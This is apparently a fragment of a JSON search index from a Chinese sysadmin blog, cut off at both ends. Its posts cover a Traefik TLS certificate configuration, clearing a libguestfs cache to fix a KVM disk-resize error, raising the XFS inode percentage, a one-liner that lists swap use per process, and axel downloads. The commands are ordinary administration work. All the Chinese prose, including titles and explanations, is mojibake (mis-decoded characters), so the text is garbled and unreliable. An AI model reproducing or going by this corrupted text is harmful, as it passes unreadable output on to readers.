class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ecertificates\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ecertFile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/export/servers/traefik/ddky.crt\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ekeyFile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/export/servers/traefik/ddky.key\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003edefault\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003esniStrict\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eminVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eVersionTLS12\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ecipherSuites\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003etest7-01.ymlå•ç‹¬test7.ddky.comçš„é…ç½®\u003c/p\u003e","title":"traefiké…ç½®digicertå®¶å¾—æ³›åŸŸåè¯ä¹¦"},{"content":"åœ¨172.18.30.1å’Œ172.16.60.10ä¸Š\nä½¿ç”¨vm.shåˆ›å»ºè™šæœºæ—¶ï¼Œä¼šæŠ¥é”™\n- Resizing the disk to 80G ... ERR: Could not resize disk. å» /export/kvm/è™šæœºç›®å½•ä¸‹æŸ¥çœ‹log\nCould not open \u0026#39;/var/tmp/.guestfs-101448/appliance.d/root\u0026#39;: No such file or directory è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œæ¸…é™¤æ‰Cacheå³å¯ï¼š\nrm -rf /var/tmp/.guestfs-0/ é™„ä¸ŠCentOS7å®‰è£… kvm çš„å‘½ä»¤ï¼š\nyum install qemu-kvm libvirt libvirt-python libguestfs-tools virt-install ","permalink":"https://rendoumi.com/posts/20231221-vm_error/","summary":"\u003cp\u003eåœ¨172.18.30.1å’Œ172.16.60.10ä¸Š\u003c/p\u003e\n\u003cp\u003eä½¿ç”¨vm.shåˆ›å»ºè™šæœºæ—¶ï¼Œä¼šæŠ¥é”™\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231221-vm_error/2022-04-22_140600.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Resizing the disk to 80G ... ERR: Could not resize disk.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå» /export/kvm/è™šæœºç›®å½•ä¸‹æŸ¥çœ‹log\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCould not open \u003cspan class=\"s1\"\u003e\u0026#39;/var/tmp/.guestfs-101448/appliance.d/root\u0026#39;\u003c/span\u003e: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œæ¸…é™¤æ‰Cacheå³å¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erm -rf /var/tmp/.guestfs-0/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé™„ä¸ŠCentOS7å®‰è£… kvm çš„å‘½ä»¤ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install qemu-kvm libvirt libvirt-python libguestfs-tools virt-install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"vm.shåˆ›å»ºè™šæœºå¤±è´¥"},{"content":"ç»ˆäºé‡åˆ°äº†inodeä¸å¤Ÿäº†ï¼Œç»†ç¢æ–‡ä»¶çˆ†æ£šäº†ï¼Œå¯¼è‡´inodeä¸å¤Ÿäº†ã€‚\nXFS æ–‡ä»¶ç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯æ²¡æœ‰ inode çš„é™åˆ¶çš„\nåªæœ‰ä¸€ä¸ªç¼ºçœçš„é™åˆ¶ï¼Œä½¿ç”¨ç°æœ‰æ–‡ä»¶ç³»ç»Ÿçš„ 25% æ¥å­˜å‚¨ inode ä¿¡æ¯ã€‚\nè¿™ä¸ªç¼ºçœçš„é…ç½®åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯å¤Ÿç”¨çš„ã€‚\næŸäº›æƒ…å†µä¸‹ä¸å¤Ÿç”¨ï¼Œå¯ä»¥åˆ é™¤ä¸€äº›æ–‡ä»¶æ¥ç¼“è§£ã€‚\nç»ˆæåŠæ³•æ˜¯å¢å¤§è¿™ä¸ª 25% çš„é˜ˆå€¼æ¥è§£å†³ï¼š\nroot@zombie:~# xfs_info /srv/backup/ metadane=/dev/mapper/slow-backup isize=256 agcount=17, agsize=2621440 blks = sectsz=512 attr=2 data = bsize=4096 blocks=44564480, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 log =internal bsize=4096 blocks=20480, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime=brak extsz=4096 blocks=0, rtextents=0 ä¸Šé¢ï¼Œæˆ‘ä»¬çœ‹åˆ° imaxpct=25 ï¼Œå°±æ˜¯è¿™ä¸ªé…ç½®äº†ã€‚\nå¢å¤§çš„æ–¹æ³•ï¼š\nxfs_growfs -m 30 è¿™æ ·å°±å¢å¤§åˆ° 30% äº†\n","permalink":"https://rendoumi.com/posts/20231221-inode_xfs/","summary":"\u003cp\u003eç»ˆäºé‡åˆ°äº†inodeä¸å¤Ÿäº†ï¼Œç»†ç¢æ–‡ä»¶çˆ†æ£šäº†ï¼Œå¯¼è‡´inodeä¸å¤Ÿäº†ã€‚\u003c/p\u003e\n\u003cp\u003eXFS æ–‡ä»¶ç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯æ²¡æœ‰ inode çš„é™åˆ¶çš„\u003c/p\u003e\n\u003cp\u003eåªæœ‰ä¸€ä¸ªç¼ºçœçš„é™åˆ¶ï¼Œä½¿ç”¨ç°æœ‰æ–‡ä»¶ç³»ç»Ÿçš„ 25% æ¥å­˜å‚¨ inode ä¿¡æ¯ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªç¼ºçœçš„é…ç½®åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯å¤Ÿç”¨çš„ã€‚\u003c/p\u003e\n\u003cp\u003eæŸäº›æƒ…å†µä¸‹ä¸å¤Ÿç”¨ï¼Œå¯ä»¥åˆ é™¤ä¸€äº›æ–‡ä»¶æ¥ç¼“è§£ã€‚\u003c/p\u003e\n\u003cp\u003eç»ˆæåŠæ³•æ˜¯å¢å¤§è¿™ä¸ª 25% çš„é˜ˆå€¼æ¥è§£å†³ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot@zombie:~# xfs_info /srv/backup/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emetadane\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/mapper/slow-backup \u003cspan class=\"nv\"\u003eisize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e256\u003c/span\u003e    \u003cspan class=\"nv\"\u003eagcount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e17, \u003cspan class=\"nv\"\u003eagsize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2621440\u003c/span\u003e \u003cspan class=\"nv\"\u003eblks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e=\u003c/span\u003e                       \u003cspan class=\"nv\"\u003esectsz\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e512\u003c/span\u003e   \u003cspan class=\"nv\"\u003eattr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edata\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u003c/span\u003e                       \u003cspan class=\"nv\"\u003ebsize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e   \u003cspan class=\"nv\"\u003eblocks\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e44564480, \u003cspan class=\"nv\"\u003eimaxpct\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e25\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e=\u003c/span\u003e                       \u003cspan class=\"nv\"\u003esunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e      \u003cspan class=\"nv\"\u003eswidth\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e blks\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003enaming\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003eversion \u003cspan class=\"m\"\u003e2\u003c/span\u003e              \u003cspan class=\"nv\"\u003ebsize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ascii-ci\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elog\u003c/span\u003e     \u003cspan class=\"o\"\u003e=\u003c/span\u003einternal               \u003cspan class=\"nv\"\u003ebsize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e   \u003cspan class=\"nv\"\u003eblocks\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e20480, \u003cspan class=\"nv\"\u003eversion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e=\u003c/span\u003e                       \u003cspan class=\"nv\"\u003esectsz\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e512\u003c/span\u003e   \u003cspan class=\"nv\"\u003esunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e blks, lazy-count\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erealtime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrak                   \u003cspan class=\"nv\"\u003eextsz\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e   \u003cspan class=\"nv\"\u003eblocks\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0, \u003cspan class=\"nv\"\u003ertextents\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢ï¼Œæˆ‘ä»¬çœ‹åˆ° imaxpct=25 ï¼Œå°±æ˜¯è¿™ä¸ªé…ç½®äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¢å¤§çš„æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exfs_growfs -m \u003cspan class=\"m\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±å¢å¤§åˆ° 30% äº†\u003c/p\u003e","title":"Xfsæ–‡ä»¶ç³»ç»Ÿä¸‹å¢åŠ inode"},{"content":"åœ¨æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤free -g å’Œ free -k\nçœ‹çœ‹æœ‰å¤šå°‘ç©ºé—²\n8Gçš„Swapäº¤æ¢ç©ºé—´éƒ½è¢«ç”¨å…‰äº†ï¼ï¼ï¼\nå†ç”¨kbçš„å•ä½çœ‹çœ‹ï¼Œä¸€å…±8388604ï¼ŒåŸºæœ¬ç”¨å…‰æ‰äº†\næŸ¥çœ‹æ˜¯å“ªäº›è¿›ç¨‹ä½¿ç”¨äº†äº¤æ¢ç©ºé—´ï¼š\nfind /proc -maxdepth 2 -path \u0026#34;/proc/[0-9]*/status\u0026#34; -readable -exec awk -v FS=\u0026#34;:\u0026#34; \u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) printf \u0026#34;%10s %-30s %20s\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;]}\u0026#39; \u0026#39;{}\u0026#39; \\; | awk \u0026#39;{print $(NF-1),$0}\u0026#39; | sort -h | cut -d \u0026#34; \u0026#34; -f2- 6504çš„qemu-kvmç”¨æ‰äº†4.8Gï¼Œçœ‹èµ·æ¥ä¸å¤ªç›´è§‚ã€‚\nfind /proc -maxdepth 2 -path \u0026#34;/proc/[0-9]*/status\u0026#34; -readable -exec awk -v FS=\u0026#34;:\u0026#34; -v TOTSWP=\u0026#34;$(cat /proc/swaps | sed 1d | awk \u0026#39;BEGIN{sum=0} {sum=sum+$(NF-2)} END{print sum}\u0026#39;)\u0026#34; \u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) {used_swap=process[\u0026#34;VmSwap\u0026#34;];sub(/[ a-zA-Z]+/,\u0026#34;\u0026#34;,used_swap);percent=(used_swap/TOTSWP*100); printf \u0026#34;%10s %-30s %20s %6.2f%\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;],percent} }\u0026#39; \u0026#39;{}\u0026#39; \\; | awk \u0026#39;{print $(NF-2),$0}\u0026#39; | sort -hr | head | cut -d \u0026#34; \u0026#34; -f2- ä¸€ç›®äº†ç„¶ï¼Œ6504æ˜¯å°Win7çš„è™šæœºï¼Œç¥¸å®³å•Šã€‚\n","permalink":"https://rendoumi.com/posts/20231215-swap_usage/","summary":"\u003cp\u003eåœ¨æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤free -g å’Œ free -k\u003c/p\u003e\n\u003cp\u003eçœ‹çœ‹æœ‰å¤šå°‘ç©ºé—²\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231215-swap_usage/2020-07-14_175935.png\"\u003e\u003c/p\u003e\n\u003cp\u003e8Gçš„Swapäº¤æ¢ç©ºé—´éƒ½è¢«ç”¨å…‰äº†ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eå†ç”¨kbçš„å•ä½çœ‹çœ‹ï¼Œä¸€å…±8388604ï¼ŒåŸºæœ¬ç”¨å…‰æ‰äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231215-swap_usage/2020-07-14_180008.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹æ˜¯å“ªäº›è¿›ç¨‹ä½¿ç”¨äº†äº¤æ¢ç©ºé—´ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /proc -maxdepth \u003cspan class=\"m\"\u003e2\u003c/span\u003e -path \u003cspan class=\"s2\"\u003e\u0026#34;/proc/[0-9]*/status\u0026#34;\u003c/span\u003e -readable -exec awk -v \u003cspan class=\"nv\"\u003eFS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:\u0026#34;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) printf \u0026#34;%10s %-30s %20s\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;]}\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{}\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $(NF-1),$0}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -h \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e -f2-\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231215-swap_usage/2020-07-14_180122.png\"\u003e\u003c/p\u003e\n\u003cp\u003e6504çš„qemu-kvmç”¨æ‰äº†4.8Gï¼Œçœ‹èµ·æ¥ä¸å¤ªç›´è§‚ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /proc -maxdepth \u003cspan class=\"m\"\u003e2\u003c/span\u003e -path \u003cspan class=\"s2\"\u003e\u0026#34;/proc/[0-9]*/status\u0026#34;\u003c/span\u003e -readable -exec awk -v \u003cspan class=\"nv\"\u003eFS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:\u0026#34;\u003c/span\u003e -v \u003cspan class=\"nv\"\u003eTOTSWP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat /proc/swaps \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed 1d \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;BEGIN{sum=0} {sum=sum+$(NF-2)} END{print sum}\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) {used_swap=process[\u0026#34;VmSwap\u0026#34;];sub(/[ a-zA-Z]+/,\u0026#34;\u0026#34;,used_swap);percent=(used_swap/TOTSWP*100); printf \u0026#34;%10s %-30s %20s %6.2f%\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;],percent} }\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{}\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e  \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $(NF-2),$0}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -hr \u003cspan class=\"p\"\u003e|\u003c/span\u003e head \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e -f2-\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231215-swap_usage/2020-07-14_180338.png\"\u003e\u003c/p\u003e","title":"æŸ¥çœ‹SWAPäº¤æ¢ç©ºé—´è¢«å“ªä¸ªè¿›ç¨‹ç»™ç”¨æ‰äº†"},{"content":"Linuxä¸‹å¤šçº¿ç¨‹ä¸‹è½½å·¥å…·ï¼Œä¸”æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œæœºæˆ¿ä¼ æ–‡ä»¶å¿…å¤‡ï¼š\naxel -s 9000000 -a -n 5 -o ord_his.dmp http://172.16.24.2:8080/ord_his.dmp -s é™é€Ÿï¼Œ9000000æ˜¯70Må¸¦å®½ï¼Œä¸åŠ så°±æ˜¯100Mæ¦¨å¹² -n çº¿ç¨‹ï¼Œç¼ºçœæ˜¯4 -o ç›®çš„æ–‡ä»¶ -a è¿›åº¦æ¡å‹ç¼©å±•ç¤ºï¼Œå¿…é¡»åŠ ï¼Œå¦åˆ™ä¼šè¿›åº¦æ»¡å¤©é£\næ³¨æ„ï¼šaxel æ˜¯å¯ä»¥è‡ªåŠ¨æ–­ç‚¹ç»­ä¼ çš„\n","permalink":"https://rendoumi.com/posts/20231215-axel_download/","summary":"\u003cp\u003eLinuxä¸‹å¤šçº¿ç¨‹ä¸‹è½½å·¥å…·ï¼Œä¸”æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œæœºæˆ¿ä¼ æ–‡ä»¶å¿…å¤‡ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaxel -s \u003cspan class=\"m\"\u003e9000000\u003c/span\u003e -a -n \u003cspan class=\"m\"\u003e5\u003c/span\u003e -o ord_his.dmp http://172.16.24.2:8080/ord_his.dmp \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e-s é™é€Ÿï¼Œ9000000æ˜¯70Må¸¦å®½ï¼Œä¸åŠ så°±æ˜¯100Mæ¦¨å¹²\n-n çº¿ç¨‹ï¼Œç¼ºçœæ˜¯4\n-o ç›®çš„æ–‡ä»¶\n-a è¿›åº¦æ¡å‹ç¼©å±•ç¤ºï¼Œå¿…é¡»åŠ ï¼Œå¦åˆ™ä¼šè¿›åº¦æ»¡å¤©é£\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼šaxel æ˜¯å¯ä»¥è‡ªåŠ¨æ–­ç‚¹ç»­ä¼ çš„\u003c/p\u003e","title":"Linuxæ”¯æŒæ–­ç‚¹ç»­ä¼ 